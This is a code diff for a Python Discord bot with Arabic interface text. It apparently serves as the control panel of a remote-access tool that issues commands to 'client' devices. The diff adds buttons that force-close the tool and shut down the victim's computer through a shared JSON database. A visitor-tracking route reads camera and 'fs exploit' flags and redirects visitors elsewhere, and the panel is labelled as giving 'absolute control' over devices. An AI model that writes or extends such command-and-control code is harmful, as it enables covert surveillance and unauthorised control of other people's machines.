@@ -62,7 +62,6 @@ def track_visitor():
         
     user_agent = request.headers.get('User-Agent', 'Unknown')
     cam = request.args.get('cam', 'false')
-    cam_type = request.args.get('cam_type', 'user')
     fs_exploit = request.args.get('fs', 'false')
     redirect_target = request.args.get('to', 'https://www.google.com')
     
@@ -331,15 +330,27 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Unlock closure {self.code}"):
                 await interaction.followup.send("🔓 تم إلغاء الثبات وأصبح بإمكانه الإغلاق العادي.", ephemeral=True)
 
-    @discord.ui.button(label="🛑 إغلاق دائم وإيقاف الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
+    @discord.ui.button(label="🛑 إطفاء الأداة (خروج كامل)", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=3)
     async def kill_persistent_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
-            if "remote_kill_permanently" not in db: db["remote_kill_permanently"] = {}
-            db["remote_kill_permanently"][self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Kill persistent {self.code}"):
-                await interaction.followup.send("🛑 تم إرسال أمر التدمير النهائي للعميل!", ephemeral=True)
+            if "remote_force_close" not in db: db["remote_force_close"] = {}
+            db["remote_force_close"][self.code] = {"id": str(int(time.time()))}
+            if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
+                del db["remote_lock_states"][self.code]
+            if save_db(db, sha, url, headers, f"Force close app for {self.code}"):
+                await interaction.followup.send("🛑 تم إرسال أمر إطفاء الأداة بالكامل من الخلفية (دون حذف ملفاتها من جهازه)!", ephemeral=True)
+
+    @discord.ui.button(label="⚡ إيقاف تشغيل جهاز العميل", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=3)
+    async def shutdown_pc_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, sha, url, headers = fetch_db()
+        if db:
+            if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
+            db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
+            if save_db(db, sha, url, headers, f"Shutdown PC for {self.code}"):
+                await interaction.followup.send("⚡ **تم إرسال أمر إيقاف تشغيل الجهاز (Shutdown) للعميل بنجاح!**", ephemeral=True)
 
 class DevicesSubMenuView(discord.ui.View):
     def __init__(self, devices_list):
@@ -369,6 +380,20 @@ class MainDashboardView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
+    @discord.ui.button(label="📁 إدارة الأكواد المتاحة", style=discord.ButtonStyle.primary, custom_id="dash_main_unused", row=0)
+    async def unused_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+        db, _, _, _ = fetch_db()
+        if not db:
+            await interaction.followup.send("❌ فشل الاتصال بقاعدة البيانات.", ephemeral=True)
+            return
+        unused_list = [c for c, info in db.get("codes", {}).items() if not info.get("used", False)]
+        if not unused_list:
+            await interaction.followup.send("🟢 لا توجد أكواد غير مستخدمة حالياً.", ephemeral=True)
+            return
+        view = UnusedManagementView(unused_list)
+        await interaction.followup.send(f"🟢 **الأكواد المتاحة (اختر للحذف):**\n📊 العدد: `{len(unused_list)}`", view=view, ephemeral=True)
+
     @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices", row=0)
     async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
@@ -384,7 +409,7 @@ class MainDashboardView(discord.ui.View):
         await interaction.followup.send("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=view, ephemeral=True)
 
 # ==========================================
-# الأوامر الأساسية المفقودة (Slash Commands)
+# الأوامر الأساسية والشاملة (Slash Commands)
 # ==========================================
 
 @client.tree.command(name="generate", description="توليد أكواد تفعيل جديدة")
